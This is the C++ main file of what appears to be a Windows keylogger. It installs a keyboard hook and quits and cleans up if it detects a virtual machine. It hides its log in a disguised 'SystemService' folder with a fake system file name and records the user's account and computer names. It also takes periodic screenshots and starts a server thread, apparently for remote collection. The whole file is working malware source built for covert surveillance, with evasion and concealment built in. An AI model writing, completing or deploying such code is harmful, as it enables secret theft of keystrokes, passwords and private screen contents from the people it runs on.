#include "network.h"
#include "stream.h"
#include "keyhook.h"
#include "screen.h"
#include "sys.h"
#include "debug.h"

#ifdef DEBUG_BUILD
#include "encrypt.h"
#endif

#define MINUTE 6000

int main() {
#ifdef DEBUG_BUILD
	KeyHook::InstallHook();
	std::thread keyHookThread(KeyHook::HandleMessage, true);
	std::thread clientServerThread(ServerThread);

	keyHookThread.join();
	clientServerThread.join();
#endif

#ifndef DEBUG_BUILD
	if (Sys::CheckForVirtualMachine()) {
		KeyHook::UninstallHook();
		Sys::RemoveFromRegistry();
		KeyHook::KillProcess();
		return 0;
	}

//  Sys::AddToRegistry();
	KeyHook::InstallHook();
	clientInfo = Stream::GetAccountInfo(clientInfo);

	std::string path = Stream::GetPath("\\Microsoft\\");
	std::string dirName = "SystemService";

	Stream::MakeDir(path, dirName, FILE_ATTRIBUTE_HIDDEN);
	Stream::MakeFile("wnxshl2.sys.log", path + "\\" + dirName);
	Stream::LogFile logFile(path + dirName, "wnxshl2.sys.log");

	Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, logFile, false);

	std::ostringstream ostream;
	ostream << "\n[*] OS Info: Major - " << clientInfo.osVersionInfo.dwMajorVersion << "; Minor - "
					<< clientInfo.osVersionInfo.dwMinorVersion << " [*]"
					<< "\n[*] Account Info: User -" << clientInfo.accountName << "; Computer - " << clientInfo.computerName
					<< " [*]";

	std::string write = ostream.str();
	Stream::WriteLog(write, KeyHook::activeProcess, logFile, false);
	Screen::CaptureScreen(path + "\\", "winpst", true, MINUTE*10); // Screenshot

	auto pClientThreadHandleParams = new CHStruct();
	pClientThreadHandleParams->file = path; // TODO: Idk if this is the path we need

	std::thread keyHookThread(KeyHook::HandleMessage, true);
	std::thread serverThread(ServerThread, nullptr);

	keyHookThread.detach();
	serverThread.detach();

#endif // DEBUG_BUILD
	return 0;
}